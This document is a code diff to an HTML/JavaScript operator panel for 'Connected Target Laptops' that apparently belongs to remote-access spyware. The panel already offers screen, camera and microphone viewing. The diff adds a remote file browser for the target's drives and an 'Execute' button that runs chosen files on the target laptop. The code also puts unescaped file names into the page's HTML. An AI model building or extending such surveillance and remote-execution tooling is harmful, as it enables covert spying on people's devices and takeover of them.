@@ -20,8 +20,31 @@
         <button id="viewScreenBtn" style="background: #28a745;">🖥️ View Screen</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
+        <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
     </div>
-    <video id="preview-video" autoplay playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #ffc107; border-radius: 8px; background: black;"></video>
+    
+    <div id="file-browser" class="hidden" style="width: 90%; max-width: 1000px; margin: 20px auto; background: #333; border-radius: 8px; padding: 15px; text-align: left; border: 2px solid #6f42c1;">
+        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+            <button id="fileUpBtn" style="background: #555;">⬆️ Up</button>
+            <input type="text" id="currentPath" readonly style="flex-grow: 1; padding: 8px; background: #222; color: white; border: 1px solid #555; border-radius: 4px;" value="">
+            <button id="refreshFilesBtn" style="background: #007bff;">🔄 Refresh</button>
+        </div>
+        <div id="fileListContainer" style="max-height: 400px; overflow-y: auto; background: #222; border: 1px solid #444; border-radius: 4px;">
+            <table style="width: 100%; border-collapse: collapse; color: white;">
+                <thead>
+                    <tr style="background: #444; text-align: left;">
+                        <th style="padding: 10px;">Name</th>
+                        <th style="padding: 10px; width: 100px;">Type</th>
+                        <th style="padding: 10px; width: 100px;">Action</th>
+                    </tr>
+                </thead>
+                <tbody id="fileTableBody">
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <video id="preview-video" autoplay muted playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #ffc107; border-radius: 8px; background: black;"></video>
     <img id="preview-img" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #28a745; border-radius: 8px; background: black;">
     <br>
     <button id="backBtn" class="hidden" style="margin-top:20px; background: #dc3545;">Back to PC List</button>
@@ -69,6 +92,7 @@
             document.getElementById('controls').classList.remove('hidden');
             document.getElementById('preview-video').classList.add('hidden');
             document.getElementById('preview-img').classList.add('hidden');
+            document.getElementById('file-browser').classList.add('hidden');
             
             document.getElementById('backBtn').classList.remove('hidden');
             document.getElementById('title').innerText = "Viewing Options for: " + clientName;
@@ -94,6 +118,8 @@
                 peerConnection = null;
                 document.getElementById('preview-video').srcObject = null;
                 document.getElementById('preview-video').classList.add('hidden');
+            } else if (activeType === 'files') {
+                document.getElementById('file-browser').classList.add('hidden');
             }
         }
 
@@ -125,10 +151,94 @@
             socket.emit('request-mic', activeTarget);
         };
 
+        let currentBrowserPath = "";
+
+        document.getElementById('browseFilesBtn').onclick = () => {
+            if (activeType === 'files') return;
+            stopCurrentActive();
+            activeType = 'files';
+            document.getElementById('file-browser').classList.remove('hidden');
+            document.getElementById('title').innerText = "Browsing Files: " + activeTarget;
+            requestFiles(""); // Get root drives
+        };
+
+        function requestFiles(path) {
+            currentBrowserPath = path;
+            document.getElementById('currentPath').value = path || "Root Drives";
+            document.getElementById('fileTableBody').innerHTML = "<tr><td colspan='3' style='padding: 10px; text-align: center;'>Loading...</td></tr>";
+            socket.emit('request-files', { targetId: activeTarget, path: path });
+        }
+
+        document.getElementById('fileUpBtn').onclick = () => {
+            if (!currentBrowserPath) return;
+            let parts = currentBrowserPath.replace(/\\$/, "").split('\\');
+            if (parts.length <= 1) {
+                requestFiles(""); // root
+            } else {
+                parts.pop();
+                requestFiles(parts.join('\\') + '\\');
+            }
+        };
+
+        document.getElementById('refreshFilesBtn').onclick = () => {
+            requestFiles(currentBrowserPath);
+        };
+
+        socket.on('file-list', (data) => {
+            if (activeType !== 'files') return;
+            const tbody = document.getElementById('fileTableBody');
+            tbody.innerHTML = "";
+            
+            if (data.error) {
+                tbody.innerHTML = `<tr><td colspan='3' style='padding: 10px; color: red;'>Error: ${data.error}</td></tr>`;
+                return;
+            }
+
+            if (!data.files || data.files.length === 0) {
+                tbody.innerHTML = "<tr><td colspan='3' style='padding: 10px; text-align: center;'>Folder is empty</td></tr>";
+                return;
+            }
+
+            data.files.forEach(f => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = "1px solid #444";
+                
+                const icon = f.isDirectory ? "📁" : "📄";
+                const type = f.isDirectory ? "Folder" : "File";
+                
+                let actionBtn = "";
+                if (f.isDirectory) {
+                    actionBtn = `<button onclick="requestFiles('${f.path.replace(/\\/g, '\\\\')}')" style="background: #007bff; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Open</button>`;
+                } else {
+                    actionBtn = `<button onclick="openRemoteFile('${f.path.replace(/\\/g, '\\\\')}')" style="background: #28a745; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Execute</button>`;
+                }
+
+                tr.innerHTML = `
+                    <td style="padding: 10px; cursor: pointer;">${icon} ${f.name}</td>
+                    <td style="padding: 10px; color: #aaa;">${type}</td>
+                    <td style="padding: 10px;">${actionBtn}</td>
+                `;
+                
+                if(f.isDirectory) {
+                    tr.cells[0].onclick = () => requestFiles(f.path);
+                }
+                
+                tbody.appendChild(tr);
+            });
+        });
+
+        window.openRemoteFile = (path) => {
+            if(confirm("Are you sure you want to run/open this file directly on the target laptop?\n\nFile: " + path)) {
+                socket.emit('open-file', { targetId: activeTarget, path: path });
+                alert("Execution request sent! The file will open on the target laptop.");
+            }
+        };
+
         document.getElementById('backBtn').onclick = () => {
             document.getElementById('clientsList').classList.remove('hidden');
             document.getElementById('preview-video').classList.add('hidden');
             document.getElementById('preview-img').classList.add('hidden');
+            document.getElementById('file-browser').classList.add('hidden');
             document.getElementById('controls').classList.add('hidden');
             document.getElementById('backBtn').classList.add('hidden');
             document.getElementById('title').innerText = "Connected Target Laptops";
